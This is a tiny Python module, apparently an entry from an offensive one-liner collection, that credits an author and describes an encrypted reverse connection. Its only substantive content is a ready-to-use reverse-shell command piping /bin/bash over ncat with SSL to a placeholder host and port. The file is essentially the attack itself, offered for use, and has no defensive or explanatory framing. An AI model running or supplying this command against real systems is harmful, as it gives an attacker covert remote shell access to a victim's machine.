class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Establish an encrypted reverse connection with ncat."
    function    = "reverse shell"
    liner       = "ncat TARGET PORT --ssl -e /bin/bash"
